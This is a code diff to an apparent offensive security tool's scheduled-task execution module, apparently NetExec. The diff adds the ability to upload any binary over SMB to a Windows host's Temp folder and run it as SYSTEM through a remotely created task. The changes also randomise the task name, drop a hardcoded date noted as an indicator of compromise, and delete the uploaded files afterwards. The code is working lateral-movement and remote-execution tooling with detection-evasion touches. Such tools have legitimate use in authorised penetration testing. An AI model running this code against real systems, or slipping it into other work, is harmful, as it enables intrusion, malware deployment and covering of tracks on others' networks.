@@ -8,9 +8,13 @@ from nxc.paths import TMP_PATH
 from time import sleep
 from datetime import datetime, timedelta
 
+# Thanks @Shad0wC0ntr0ller for the idea of removing the hardcoded date that could be used as an IOC
+# Modified by @Defte_ so that output on multiples lines are printed correctly (28/04/2025)
+# Modified by @Defte_ so that we can upload a custom binary to execute using the BINARY option (28/04/2025)
+
 
 class TSCH_EXEC:
-    def __init__(self, target, share_name, username, password, domain, task_name, run_task_as, doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
+    def __init__(self, target, share_name, username, password, domain, task_name=None, run_task_as=None, upload_task_binary=None, doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
         self.__target = target
         self.__username = username
         self.__password = password
@@ -28,8 +32,14 @@ class TSCH_EXEC:
         self.__output_filename = None
         self.__share = share
         self.logger = logger
-        self.task_name = task_name
-        self.run_task_as = run_task_as 
+        self.upload_task_binary = upload_task_binary
+        # Specifies that the task should be run as SYSTEM (S-1-5-18) or the run_task_as username
+        self.run_task_as = "S-1-5-18" if run_task_as is None else run_task_as
+        # Specified the task name or a random one
+        self.task_name = task_name if task_name is not None else gen_random_string(8)
+
+        # Default places to upload a binary
+        self.temp_dir = "\\Windows\\Temp\\"
 
         if hashes is not None:
             # This checks to see if we didn't provide the LM Hash
@@ -109,7 +119,7 @@ class TSCH_EXEC:
             <Command>cmd.exe</Command>
         """
         if self.__retOutput:
-            self.__output_filename = "\\Windows\\Temp\\" + gen_random_string(6)
+            self.__output_filename = f"{self.temp_dir}\{gen_random_string(6)}"
             if fileless:
                 local_ip = self.__rpctransport.get_socket().getsockname()[0]
                 argument_xml = f"      <Arguments>/C {command} &gt; \\\\{local_ip}\\{self.__share_name}\\{self.__output_filename} 2&gt;&amp;1</Arguments>"
@@ -138,8 +148,26 @@ class TSCH_EXEC:
         dce.set_credentials(*self.__rpctransport.get_credentials())
         dce.connect()
 
-        xml = self.gen_xml(command, fileless)
+        # Creates a fully working SMB connection used to upload/delete files
+        smbConnection = self.__rpctransport.get_smb_connection()
 
+        # Uploads the binary that will be run via the scheduled task
+        if self.upload_task_binary is not None:
+            if os.path.isfile(self.upload_task_binary):
+                self.logger.success(f"Binary {self.upload_task_binary} successfully uploaded")
+                upload_task_binary = self.upload_task_binary
+                # Strip the binary_name in case a path is provided
+                binary_name = os.path.basename(upload_task_binary)
+                # Uploads the file to \\Windows\Temp\binary.exe
+                with open(upload_task_binary, "rb") as binary_content:
+                    smbConnection.putFile(self.__share, f"{self.temp_dir}{binary_name}", binary_content.read)
+                # Modifies the command to run to include full path
+                command = f"{self.temp_dir}{command}"
+            else:
+                self.logger.fail(f"Cannot open {self.upload_task_binary}, canceling task creation")
+                return
+
+        xml = self.gen_xml(command, fileless)
         self.logger.debug(f"Task XML: {xml}")
         self.logger.info(f"Creating task \\{self.task_name}")
         try:
@@ -150,6 +178,7 @@ class TSCH_EXEC:
         except Exception as e:
             if e.error_code and hex(e.error_code) == "0x80070005":
                 self.logger.fail("Scheduled task creation was blocked.")
+            # That error implies that it was not possible to translate the username to a valid windows station session ID
             elif hex(e.error_code) == "0x80070534":
                 self.logger.fail(f"User {self.run_task_as} does not have a valid windows station session, cannot run the task.")
             else:
@@ -217,7 +246,15 @@ class TSCH_EXEC:
                 try:
                     self.logger.debug(f"Deleting file {self.__share}\\{self.__output_filename}")
                     smbConnection.deleteFile(self.__share, self.__output_filename)
-                except Exception:
-                    pass
+                except Exception as e:
+                    self.logger.fail(f"Error while deleting file {self.__share}\\{self.__output_filename}: {e}")
+
+                # Removes the uploaded binary that was run via the scheduled task
+                if self.upload_task_binary is not None:
+                    try:
+                        self.logger.success(f"Binary {self.temp_dir}{binary_name} successfully deleted")
+                        smbConnection.deleteFile(self.__share, f"{self.temp_dir}{binary_name}")
+                    except Exception as e:
+                        self.logger.fail(f"Couldn't remove {self.temp_dir}{binary_name}: {e}")
 
         dce.disconnect()
